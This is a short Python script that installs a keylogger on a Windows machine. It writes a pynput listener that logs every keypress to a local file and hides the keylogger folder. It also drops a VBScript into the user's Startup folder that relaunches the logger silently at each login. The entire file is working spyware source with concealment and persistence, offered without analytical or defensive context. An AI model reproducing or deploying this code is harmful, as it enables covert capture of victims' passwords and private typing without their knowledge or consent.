import os
import sys
os.system("pip install pynput")
user = os.getlogin() #get user
pwd = f"C:/Users/{user}"
os.chdir(pwd)
os.system("mkdir keylogger")
pwd = f"C:/Users/{user}/keylogger"
os.chdir(pwd)
file_path = fr"'C:/Users/{user}/keylogger/log.txt'"
logger = fr'''from pynput import keyboard

def on_press(key):
    with open({file_path},'a+') as f:
        try:
            f.write(key.char)  
        except AttributeError as e:
            f.write(str(key)+" ")
        except Exception as e:
            f.write(str(key)+" ")


if __name__=="__main__":
    with keyboard.Listener(
        on_press=on_press
    ) as l:
        l.join()'''

bat = fr'''"{sys.executable}" C:\Users\{user}\keylogger\keylogger.py'''

vbs = fr'''set code = CreateObject("WScript.shell")
code.Run "C:\Users\{user}\keylogger\keylogger.bat",0,False'''


startup = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

with open("keylogger.py",'w') as f:
    f.write(logger)
with open("keylogger.bat",'w') as f:
    f.write(bat)
os.system("cd .. && attrib +h keylogger")
os.chdir(path=startup)
with open("log.vbs",'w') as f:
    f.write(vbs)

